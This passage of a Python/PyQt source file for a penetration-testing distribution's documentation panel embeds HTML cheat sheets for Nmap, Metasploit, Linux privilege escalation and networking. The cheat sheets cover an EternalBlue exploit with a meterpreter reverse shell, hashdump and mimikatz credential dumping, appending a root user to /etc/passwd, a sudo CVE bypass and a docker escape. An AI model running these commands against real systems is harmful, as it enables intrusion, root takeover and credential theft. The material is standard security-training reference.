  <tr><td>/usr/bin/hsh</td><td>HackerOS shell</td></tr>
  <tr><td>~/.cache/HackerOS/Cybersecurity-Mode/config.json</td><td>User config</td></tr>
  <tr><td>~/.local/share/HackerOS/Cybersecurity-Mode/logs/</td><td>Application logs</td></tr>
  <tr><td>/etc/HackerOS/Cybersecurity-Mode/defaults.json</td><td>System defaults</td></tr>
  <tr><td>/tmp/cybersec-mode-backend.sock</td><td>IPC socket</td></tr>
  <tr><td>/usr/share/HackerOS/ICONS/HackerOS.png</td><td>App icon</td></tr>
</table>

<h2>Config Keys</h2>
<pre>{
  "mode":              "red",          // "red" | "blue"
  "always_ask_mode":   true,           // ask on every startup
  "theme":             "dark_gray",    // dark_gray|dark_black|dark_slate|light
  "font_size":         13,
  "terminal_font_size":13,
  "shell":             "hsh",          // hsh|bash|zsh|fish
  "container_engine":  "podman",       // podman|docker
  "container_image":   "blackarchlinux/blackarch",
  "container_name":    "cybersec-mode-env",
  "log_level":         "INFO",
  "keybindings": {
    "toggle_terminal": "Ctrl+T",
    "toggle_docs":     "Ctrl+D",
    "toggle_main":     "Ctrl+M",
    "toggle_settings": "Ctrl+,",
    "hacker_menu":     "Ctrl+H"
  }
}</pre>
"""),
    },

    "Cheat Sheets": {

        "Nmap Quick Reference": page("""
<h1>Nmap Quick Reference</h1>
<pre># Host discovery
nmap -sn 192.168.1.0/24           # ping sweep
nmap -sn -PS22,80,443 10.0.0.0/8  # TCP SYN ping

# Port scanning
nmap -sS 192.168.1.100            # SYN scan (default, fast)
nmap -sT 192.168.1.100            # TCP connect scan
nmap -sU 192.168.1.100            # UDP scan
nmap -p- 192.168.1.100            # all 65535 ports
nmap -p 22,80,443,3389 target     # specific ports
nmap --top-ports 1000 target      # top 1000 ports

# Service & version detection
nmap -sV 192.168.1.100            # service versions
nmap -sV --version-intensity 9    # maximum version detection
nmap -O 192.168.1.100             # OS fingerprinting
nmap -A 192.168.1.100             # aggressive (-sV -O -sC --traceroute)

# NSE scripts
nmap -sC 192.168.1.100            # default scripts
nmap --script vuln 192.168.1.100  # vulnerability scripts
nmap --script smb-enum-shares 192.168.1.100
nmap --script http-title 192.168.1.0/24

# Output formats
nmap -oA /home/results/scan       # all formats (XML, grepable, normal)
nmap -oX /home/results/scan.xml   # XML only
nmap -oG /home/results/scan.gnmap # grepable only

# Speed (T0=paranoid, T3=default, T5=insane)
nmap -T4 192.168.1.100            # aggressive timing
nmap -T1 192.168.1.100            # slow/stealthy</pre>
"""),

        "Metasploit Quick Reference": page("""
<h1>Metasploit Quick Reference</h1>
<pre># Start
msfconsole -q

# Search
search type:exploit platform:windows
search cve:2021-44228
search name:eternalblue

# Use module
use exploit/windows/smb/ms17_010_eternalblue
info       # show module info
options    # show options

# Configure
set RHOSTS 192.168.1.100
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Run
check      # check if target is vulnerable
run        # launch exploit
exploit -j # run as background job

# Meterpreter
sysinfo            # system info
getuid             # current user
getsystem          # attempt privilege escalation
hashdump           # dump password hashes
shell              # spawn system shell
migrate 1234       # migrate to process PID
load kiwi          # load mimikatz
creds_all          # dump all credentials (kiwi)

# Sessions
sessions -l        # list sessions
sessions -i 1      # interact with session 1
sessions -k 1      # kill session

# Auxiliary modules
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/title</pre>
"""),

        "Linux Privilege Escalation": page("""
<h1>Linux Privilege Escalation Checklist</h1>
<pre># System info
uname -a; id; whoami; hostname; cat /etc/os-release

# Sudo permissions
sudo -l
sudo -u#-1 /bin/bash   # CVE-2019-14287

# SUID / SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# Check GTFOBins: https://gtfobins.github.io

# Writable files owned by root
find / -writable -user root -type f 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd
echo 'hacker:$(openssl passwd hacked):0:0:root:/root:/bin/bash' >> /etc/passwd

# PATH hijacking
echo $PATH
find / -writable -type d 2>/dev/null | grep -v proc

# Cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*

# Services running as root
ps aux | grep root
ss -tlnp

# Kernel exploits
uname -r    # check kernel version
searchsploit linux kernel $(uname -r | cut -d- -f1)

# Docker escape (if in container)
id          # check for docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Capabilities
getcap -r / 2>/dev/null
# python3.8 = cap_setuid+ep → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"</pre>
"""),

        "Network Commands": page("""
<h1>Essential Network Commands</h1>
<pre># Interface & routing
ip a                           # interfaces
ip r                           # routing table
ip neigh                       # ARP table
ss -tlnp                       # listening ports (modern)
netstat -tlnp                  # listening ports (classic)
ss -anp                        # all connections

# Connectivity
ping -c 4 8.8.8.8
traceroute 8.8.8.8
mtr 8.8.8.8                    # interactive traceroute

# DNS
dig google.com
dig google.com MX
dig @8.8.8.8 google.com        # query specific server
nslookup google.com
host -a target.com

# Port checking
nc -zv 192.168.1.100 22        # check if port open
ncat -zv 192.168.1.100 80
curl -I http://192.168.1.100   # HTTP headers

# Packet capture
tcpdump -i eth0 -nn
tcpdump -i eth0 'port 80' -w /tmp/cap.pcap
tcpdump -r /tmp/cap.pcap -nn -A

# Firewall
nft list ruleset               # nftables
iptables -L -n -v              # iptables

# SSH tunnels
ssh -L 8080:internal:80 user@gateway     # local forward
ssh -R 9090:localhost:9090 user@server   # remote forward
ssh -D 1080 user@proxy                   # SOCKS proxy</pre>
"""),
    },
}


class DocsPanel(QWidget):
    def __init__(self, config):
        super().__init__()
        self._config = config
        self._build()

    def _build(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        splitter = QSplitter(Qt.Orientation.Horizontal)
        splitter.setHandleWidth(1)
        splitter.setStyleSheet("QSplitter::handle { background: #1e2028; }")

        # ── Left: navigator ───────────────────────────────────────────────
        left = QWidget()
        left.setMinimumWidth(220)
        left.setMaximumWidth(280)
        left.setStyleSheet("background: #0e0f12;")
        left_l = QVBoxLayout(left)
        left_l.setContentsMargins(0, 0, 0, 0)
        left_l.setSpacing(0)

        # Search
        search = QLineEdit()
        search.setPlaceholderText("  Search docs…")
        search.setStyleSheet(
            "QLineEdit { background: #111318; color: #aaa; border: none; "
            "border-bottom: 1px solid #1e2028; padding: 10px 14px; font-size: 12px; }"
        )
        left_l.addWidget(search)

        # Tree
        self._tree = QTreeWidget()
        self._tree.setHeaderHidden(True)
        self._tree.setIndentation(14)
        self._tree.setStyleSheet("""
            QTreeWidget {
                background: #0e0f12; color: #888;
                border: none; font-size: 12px;
            }
            QTreeWidget::item { padding: 5px 10px 5px 4px; }
            QTreeWidget::item:selected { background: #1a1c22; color: #ddd; border: none; }
            QTreeWidget::item:hover { background: #141620; }
            QTreeWidget::branch { background: #0e0f12; }
        """)
        self._populate_tree()
        self._tree.itemClicked.connect(self._on_item)
        left_l.addWidget(self._tree)

        splitter.addWidget(left)

        # ── Right: content ────────────────────────────────────────────────
        right = QWidget()
        right.setStyleSheet("background: #111114;")
        right_l = QVBoxLayout(right)
        right_l.setContentsMargins(0, 0, 0, 0)

        self._browser = QTextBrowser()
        self._browser.setOpenExternalLinks(True)
        self._browser.setStyleSheet(
            "QTextBrowser { background: #111114; color: #c0c0cc; "
            "border: none; padding: 28px 36px; font-size: 13px; }"
        )
        right_l.addWidget(self._browser)

        splitter.addWidget(right)
        splitter.setSizes([240, 760])

        layout.addWidget(splitter)

        # Show welcome on load
        search.textChanged.connect(self._search)
        self._show_page("Getting Started", "Welcome")

    def _populate_tree(self):
        for section, pages in DOCS.items():
            parent = QTreeWidgetItem(self._tree, [section])
            parent.setExpanded(True)
            parent.setData(0, Qt.ItemDataRole.UserRole, None)
            for page_name in pages:
                child = QTreeWidgetItem(parent, [page_name])
                child.setData(0, Qt.ItemDataRole.UserRole, (section, page_name))

    def _on_item(self, item: QTreeWidgetItem, _col: int):
        data = item.data(0, Qt.ItemDataRole.UserRole)
        if data:
            self._show_page(*data)

    def _show_page(self, section: str, page_name: str):
        html = DOCS.get(section, {}).get(page_name, "<p>Page not found.</p>")
        self._browser.setHtml(html)

    def _search(self, text: str):
        text = text.lower().strip()
        if not text:
            for i in range(self._tree.topLevelItemCount()):
                top = self._tree.topLevelItem(i)
                top.setHidden(False)
                for j in range(top.childCount()):
                    top.child(j).setHidden(False)
            return
        for i in range(self._tree.topLevelItemCount()):
            top = self._tree.topLevelItem(i)
            any_visible = False
            for j in range(top.childCount()):
                child = top.child(j)
                visible = text in child.text(0).lower()
                child.setHidden(not visible)
                if visible:
                    any_visible = True
            top.setHidden(not any_visible)
